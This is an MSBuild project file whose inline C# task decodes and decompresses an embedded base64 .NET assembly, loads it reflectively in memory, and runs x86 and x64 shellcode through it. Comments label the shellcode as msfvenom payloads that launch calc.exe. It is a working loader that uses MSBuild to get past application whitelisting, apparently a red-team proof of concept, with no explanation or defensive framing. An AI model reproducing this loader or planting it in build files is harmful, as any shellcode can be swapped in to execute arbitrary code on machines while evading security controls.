<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Sample"><Sample /></Target>
  <UsingTask
    TaskName="Sample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
  <Task><Code Type="Class" Language="cs"><![CDATA[

using System;
using System.Reflection;
using System.IO;
using System.IO.Compression;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;


public class Sample : Microsoft.Build.Utilities.Task, Microsoft.Build.Framework.ITask {

    private static string encoded_compressed_dll = @"7VlrbBzXdT4zs09KpLikRK5kSlqZsryipeWSuyJFyYm15C5fIilSy4ckM5GGu0NypN2d1cyQ4sqNqri10SSOYCOBgRpI2qT9oxpB2sJBjRoFXKNIEKAukiI/kiIwAhR9oUZdGCjgPmD1O3dmd/mq459p0Zmdc+8597zvmTt3ZievvUwKEXlwPXpE9CY5xwX65cd9XE1H/7SJ3gi+e+xNaeLdY7OruhUpm8aKqRYjObVUMuzIkhYx10oRvRRJX8pGikZeizU2Nhx3dUxniCYkhfx7bny+qvcX9HhkjxQnCgPxObRr/QCRmmPNoi87flOdzXFKdroK3XiBWflXb2uNOALQe8kNeEPZJcgbRHvR/OgMUcenyEntgH+BzXaAj27CY7a2YbP6djeucN3vTSpuxEzLzJHrG3wUAR/aygfyhZipFYyc4yv7LHQd2cE3uN3Np/uddlSIeOlKJ2y1EEmfKsidR2vcTy9LQj4UhQ++BhPdsi+6j6ghisw3+Nq/ipilJ9qOnvuGEQKh7bUoDDbs2THQ/prZA9loK/ondoyGX5P3mud5fD+wU7KyNxA9gF7j0WibP+qF6VaPOYTxkOclJEyqexDy3GvjfjvL+dqi4Tot+ECPECrv6IWonzV4zS+wBu92Dd7dNIS8Qci3+KIoRt8J8zss6XspvFXSd3oz/wP9aKTFHw0IAb8EAf92AcexNtdkm2M4yM4FzPMsEdgRXsjbFqG3iaINrDfkie7htuuxuEdMjMxzcxCcFgQbGlo9ba3es7+HyWPJ11p90cdAPpI4GfJFUXW+UxFfyGeg+BtMi+35jMNsiu0ZqLCGp25sEzhdF/iNXQW6hcChxJNVgSOfLPCecuI9Cnnbr7R6Q96Q54H+zOVHjx75jKPMhYCe2mMdQ3evP+A3HmehTgbHuRjMr0Fh8CVwSr6g8QQLnADoksQi0EFf+y4p6EqtcZlQhbwWhmTjSbC0UBQ3k8/X9rHUNXgPVjz3eL1he76uI3I0ymrmzdeh/z6Pmt9X0GOWLugZzI4PSu5dxPfkejIWjyXiiZ4BpnipAPg2pqPzHtEpFOsi97O2qZdWLOb4Lczw26ijzrksjbpLV+fI3Fga7RUgERjqHCwYS+59B1RaOCB3BHnR+Q8pQW3OPXzUXQr4amIduKJun5cUyR0LuP0qjeibstP66K+lMcVHz8gMfVK7so90njWKST+QffQ9AV8V8ITM8EPR3yP6GdE/JHVB9iNiWBGUG9Iy4A+VNwAjpEPbPgHfkt+QG+gPlHZwflnm0b8ghh+L/kHR/3ch1Szg3wKO0M9kjujb9CEoktBzCJzs/YKIQRJnM9/ZlBL9EF2kvwN8GnA6wjyv0j/I/4iR948x9gr9rvIvyEag08F+pHwI7ESnw/mO/JH75LlPr0S+rvzXJuy8R5H8NazR0yTtrWFdnnYpVMO+QsekthrW4TklHa5hb1JSOlbDXlAGpMepX1h/MawgN8fpGcezcFD5iI6LGKfFXKZE/1+5ILgIQDkt5nWAdqN4KCPW/dH/cZQ+cfTTyfpoFtBP/7yrVw6nQ2coi9EgKQrPE0d7ELCBTgI2U4+AAwKmBBwTcEbAqwKqgAdQB9y/LWBFwIf0jvIk/RH9HPof0k+VXvpz+hC6HtJbymcBpzxp+iHdl8fpx/B1GnDKk6Wf0XvKVfoWnsFruJfZnx/T5+TnQflNehHwL+nLoH+THgD+sfIq/RNJnm/RbwvO/fSB8iL6Ac9b6L8uvw2e1+XvC0/ehex36Kf0RcEZoz10QYpRK40BPkargJ10G/Ap+nXAhIDnBRwS9Iv0AmBWUJ4VMEffALxFPwC06CfSIfo8/YRekZ+j70H3Hvo6MnpBaqTzHm73UaNoQ9Ql2lb6CnF7gDoE3o7dILcH6QXIee5v3xXEqb7/4uPnYuOxnebch1tpfy/aFGZCHGOZ0lpRM9WlgnajhyZ0y0ZT7qG5sZKd6KW0nrN1o6SalRu9VO6lzIZaLBe0BJUTlFMLuesbfUkq43fGRc/2UbmPnp408msF7bNUtHKGWdCXKFuxbK0YGzIKBU2otGIjWkkz9RytaPb1sTwNmZpqa5e1omFrs6tA8pTK56nun2AcVUt5dIcKhqVV+1BmuMPTppHTLGtKLWq0YOq2NqGXtLpxU6Np1bQ0GlnT8ykba/7Smq1RWltaW1lhG3XakFGc1y19Cy1lWVpxqVCZ1e1dyaaa14qqeas+NKuacGsYe3LtjrF5oCozrBe0ec20kJGdg4hsWV9ZM1V71+G0ZuVMvbx1EH6X9YKQuKwV1A3Rs3YKI1P5tZy9m9FyxdRXVncdKpbVUqU+cHmtZOtFTdBtfUkv6PamUZ6QrH63ln+XO+bGi+ctDZtGcVC1tL6k8wCmW5pZ0gqJ3li+UKhVm0BEmUCNq40uY/aNIk2qeqlmQFt2q4suapV6rbGfdE0zDSpXWVEXt2loVTUplrMNhqJB1U/bZpUprasrJcOy9Zy1PQYwQl85q5nrOipu+7AzC5pZG3dKDBHizgA6otluqQIZsxaMO31Jl0CXylqp2h/WS3mnhqoUTgOCs7jsc6pNw4ZZRHNp6SZihaq+5JJuU7aMqUD+GJTWddMoFbWSLYSHDPjI0uuaadOswfc8TfEr0bxu2mtqIVXA60xmo4oOm5pWx+CGDUMgiNvL9WoSd61ZIaN8PXMbTKgCXlu6n6Uu+hz2GEO0SgZWRY1KwMpkAssBs3CeA+U5rGfY7AdjoG3gIv8G9VGSaKCq4RKkHOnpLdIRPONU0PPY1WmbddVsz+NZZJJNa+ArYN0r4GT5KJ5pm/ivVvkXhH4b2qpjEeDLwm8VzzKWVmGPd04l8Bk7IopQEb0iKCb4KbG7J9M1OznADOKOuvZOEvXXM2eCQxV8l12t3J9FRp2R/Ga5fU7vHLn524QnqJeonfFzkGHac3ien4O/iP75g43UQN1Isw6TKfe8isd7Ca5OwsVBPNp0CKTojmjHQHXaObQJtAalqR+qL9I43cS0dMPBNAyvInkpjFtCZhSBp7FhGMWZpHXwZpGYJILKIgljaC+Cg9tJ4Feg6Saxb1noGEUK5uCVTdfAwfgsbMfh2VVouItpGAd+F7wTGM2DugEv+kAZxHUHnIOg3IXGFYwuYzwNuAysHzAL7T10hoahYwJlMAQvByHTiyRPgDODiWP6IDQxPYmIMsI3HZRRcOvwbgbejEOHTUvQP4/sqaAuw48VRNODDY8Kvg1oMuHHPCi3RaZ7IYOb2838MCwYyADHuo4MduOch/1ueNWDkQIywItZGf4MYI6Wxfg0JK/RWfA4c8G+JeHZHPStweMc8pVDCQ0Im8Pg74a2BZqChSUagb01yF8BVhBefAYnPf9vTmlk4HYa6eHpMxBwtUgyUHQZYc/D5SxMzYvJmUSCx6EmK6Yyi0AyIq1zUL4KmlM6K+54BfQMsGn04wjqIhydheNcHGm0qV1KKQP6oAixAus96KcQ3Cg098OHceBzojQnBBxCO4OEb4jCyQt8RXjgRDGI/qoo8zj8j4POvWHBl0V/VfgfByf7PCOmOwmrHGs3Ul4Aj1N6Y26pLgjfdsbh+L3Z5ww08TRdgXezoEwhe+NoV2H/EnwdBieXR92HWzUfrqE/4pZnfTxXG59B5i1Bz7gx8XxdFb7xnK1iDVlAW8bYghi7JuhlkZunMM8rAp9AlEnhw6DLP+aWcRlYt3v2iFldg0ymVh/1k3PTi+hS0Jhxa2cEt+f2Mmfftpb6IPDbuHHmwXUNiw1bmhP1uAGuFeR/EDfBHdQN19C6uL1n4Gc/KnMDFiso717oSoE2B5vjwNaFreqNdxU8Z8QzZAQcKbE1Hpm+F/7u+2cyX/Se/Pb+ff+5nzwRSQooEZK86IRCjDYxkPf6g03BpsPecDgYDHtJbmrq8BAGfRHpcNNhBf1gkyAzlBlKh71Nso955XCYeQNtfv+BlowcaDrQMiYFWiYDh1tmAi0zXiJ0fM4QXv3ZPl9N/oiMt4ZWqSFCB1puy9zd1yxJLH0ElAqg0iAFvEIdvAwE4HUrBeBTK1ofKfCyQ/FLMrSFA39yd3H+YPIXX5J97KPUxLbYT7llRuEPOKSEg3KwgRBj+LA30BwMiG4gGAySV+ZOM0b9IAX55ycPd4MILRz2QWG4WQ5I7mfZI/wVYFZuWzDV8pRRymzkNLGJxa7fuGNJ4HO+xjZCoPbCQV7xBtQuUUtthxp552Ek0hvvxdvQSYmOJ5cTA0tasuf02cTy8ulkf77ntDqQ1E7nE0taItGnLSU1/kwrkb8nFucTrz8SHYpNZWZrO/RT7ub0M+vJWB+8bNpfG0rrVrmgVvjdooVlIrWRCHid16nqt3QOoAMOv38GVzvR5Ww62/A34+efHToy9fIHf/Xg0e984fc5nqFzi3MWLC7etOzVimYuYkPFGzlrcVIt3FFNLa2tz6qFW4vVPCwaSzcXsbHXsGmuEWPlfPVj1P/CI95f749X/2vY5Xi6fzOGfayZLhTE9l+8ZWqaeE3g49ET0NG8q5Jf2UMSDoedf1G20LlO4rvQ+eAvPFcuoNY2/X/SoWDnh7UtS9cBM1gDeeW9hHXwOtop8VTh4888H3zs6JG26HzGxfi7wba/RSgtuOaxFptio8Qr5pjYgBhi/LiQmsUo78otsf2xwWcAc44/9Pya+BKVBd0Ue+iVXTRdETzx2pnECs7fPA6JfPAGpyh22bwDt1zNj28aKwv7FUSrCr7qcY6C4KnaS4sde074Ud7iJ+/HVaGH+RKCFsfyVZedx2VCui7TQzHwVC+21Qj+MeEj85bEvr/u0XYbMfEWU3DntQWyE6CvCKkhsd2rCE9X8KTk/6920iL0EFcEz7S4uAhvEdIWPc7M5MWbBM/hrVr2SOymJNSGo093/a3GW/pUfveK/DrvNnk8tfndZvMc7JbXpMjrVpnt2d2e27NCJiXetziWJeiriHesT5b7lTrizv8Ti/2/lPP/j/+Dx38D";
            
    // msfvenom -p windows/exec CMD=calc.exe -f raw | base64
    private static String x86_shellcode = @"
        /OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjj
        SAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sE
        iwHQiUQkJFtbYVlaUf/gX19aixLrjV1qAY2FsgAAAFBoMYtvh//Vu/C1olZoppW9nf/VPAZ8CoD7
        4HUFu0cTcm9qAFP/1WNhbGMuZXhlAA==";

    // msfvenom -p windows/x64/exec CMD=calc.exe -f raw | base64
    private static String x64_shellcode = @"
        /EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHB
        yQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHW
        TTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFY
        QVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//V
        u/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA";

    private static byte[] decode_decompress_dll(string ecdll)
    {
        byte[] compressed_dll = System.Convert.FromBase64String(ecdll);
        System.IO.MemoryStream memstream = new System.IO.MemoryStream(compressed_dll.Length);
        System.IO.MemoryStream msptr = new System.IO.MemoryStream();
        memstream.Write(compressed_dll, 0, compressed_dll.Length);
        memstream.Seek(0, System.IO.SeekOrigin.Begin);
        using (System.IO.Compression.DeflateStream deflator =
            new System.IO.Compression.DeflateStream(
                memstream,
                System.IO.Compression.CompressionMode.Decompress
            )
        )
        {
            byte[] block = new byte[4096];
            int nbytes;
            while ((nbytes = deflator.Read(block, 0, block.Length)) != 0)
                msptr.Write(block, 0, nbytes);
        }
        return msptr.ToArray();
    }

    public override bool Execute()
    {
        System.Reflection.Assembly loaded_assembly = System.Reflection.Assembly.Load(
            decode_decompress_dll(encoded_compressed_dll)
        );
        System.Type astype = loaded_assembly.GetType("Example3");
        object class_instance = System.Activator.CreateInstance(astype, null);
        System.Reflection.MethodInfo entrypoint = astype.GetMethod("Run");
        entrypoint.Invoke(class_instance, new object[] { x86_shellcode, x64_shellcode });
        return true;
    }
}

      ]]></Code>
    </Task>
  </UsingTask>
</Project>

